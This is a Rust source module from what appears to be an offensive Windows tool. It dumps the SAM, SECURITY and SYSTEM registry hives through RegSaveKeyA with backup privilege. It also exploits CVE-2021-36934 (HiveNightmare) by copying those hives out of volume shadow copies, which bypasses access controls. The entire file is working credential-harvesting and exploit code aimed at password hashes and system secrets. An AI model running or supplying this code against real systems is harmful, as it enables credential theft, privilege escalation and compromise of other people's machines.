use anyhow::Result;
use crate::utilities::{
    Utils, 
    SE_BACKUP_NAME,
};

use std::path::Path;
use std::fs;
use std::ffi::CString;

use winapi::um::winreg::{
    RegSaveKeyA,
    RegOpenKeyExA,
};

use winapi::shared::minwindef::HKEY;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;

use winreg::enums::*;
use winreg::RegKey;

pub struct Hives;

impl Hives {
    pub fn grab(path: String) -> Result<()> {
        dump_hives(path.clone());
        hive_nightmare(path.clone());
        Ok(())
    }
}

//Requires System to get all the right handles.
fn dump_hives(path: String) {
    if Utils::enable_privilege(SE_BACKUP_NAME.as_ptr()) {
        let hives = vec!["SECURITY", "SAM", "SYSTEM"];

        if !is_path_valid(&path) {
            println!("[-] Output path is not valid");
            return;
        }

        for hive in hives {
            let key_handle = get_key_handle(hive.to_string());
            if key_handle == 0 as HKEY {
                println!("[-] Failed to get all the required handles");
                return;
            }

            if save_reg_key(key_handle, path.clone(), hive.to_string()) {
                println!("[+] Dumped: {} to: {}.hive", hive, format!("{}\\{}", path, hive));
            }
        }

    } else{
        println!("[-] Failed to enable required privileges, run as SYSTEM");
    }
}

fn hive_nightmare(path: String) {
    if is_path_valid(&path) {
        if get_build_version() > 17763 {
            println!("[+] Attempting to exploit: CVE-2021-36934");
            
            let shadow_copy_location = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy";

            for i in 0..10 {
                if copy_file(format!("{}{}\\Windows\\System32\\config\\sam",shadow_copy_location, i), format!("{}\\sam{}.hive", path, i)) {
                    println!("[*] Dumping SAM{} hive",i);
                }

                if copy_file(format!("{}{}\\Windows\\System32\\config\\security",shadow_copy_location, i), format!("{}\\security{}.hive", path, i)) {
                    println!("[*] Dumping SECURITY{} hive",i);
                }

                if copy_file(format!("{}{}\\Windows\\System32\\config\\system",shadow_copy_location, i), format!("{}\\system{}.hive", path, i)) {
                    println!("[*] Dumping SYSTEM{} hive",i);
                }
            }

            let mut results_found = false;

            for entry in Path::new(&path).read_dir().expect("read_dir call failed") {
                if let Ok(entry) = entry {
                    if format!("{}", entry.path().display()).ends_with(".hive") {
                        println!("[!] Hives have been dumped to: {}", path);
                        results_found = true;
                        break;
                    }
                }
            }

            if !results_found {
                println!("[-] No hives have been dumped using CVE-2021-36934, perhaps the system has no Shadow Volume copies.");
            }
        }
    } else {
        println!("[-] Path does not exist or is not a directory");
    }
}

fn get_key_handle(name: String) -> HKEY {
    unsafe {
        let mut hkey: HKEY = std::mem::zeroed();

        let key_name = match CString::new(name.clone()) {
            Ok(key_name) => key_name,
            Err(_) => return 0 as HKEY,
        };

        if RegOpenKeyExA(HKEY_LOCAL_MACHINE, key_name.as_ptr(), 0, KEY_READ, &mut hkey) != 0 {
            println!("[-] Failed getting key handle to: {}", name.clone());
            return 0 as HKEY;
        };
        hkey
    }
}

fn save_reg_key(key_handle: HKEY, path: String, hive_name: String) -> bool {
    unsafe {
        let dump_path = format!("{}\\{}.hive", path, hive_name);
        let cstring_dump_path = match CString::new(dump_path) {
            Ok(cstring_dump_path) => cstring_dump_path,
            Err(_) => return false,
        };

        if RegSaveKeyA (key_handle, cstring_dump_path.as_ptr(), 0 as *mut SECURITY_ATTRIBUTES) != 0 {
            println!("[-] Failed to save registry key");
            return false;
        }
        true
    }
}

fn is_path_valid(path: &str) -> bool {
    if Path::new(&path).exists() && Path::new(&path).is_dir() {
        return true;
    }
    false
}

fn get_build_version() -> i32 {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(cur_ver) = hklm.open_subkey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion") {
        if let Ok(build_version) = cur_ver.get_value("CurrentBuild") {
            return Utils::convert_string_to_i32(build_version);
        }
    }
    0
}

fn copy_file(src: String, dst: String) -> bool {
    match fs::copy(&src, &dst) {
        Ok(_) => return true,
        Err(_) => return false,
    };
}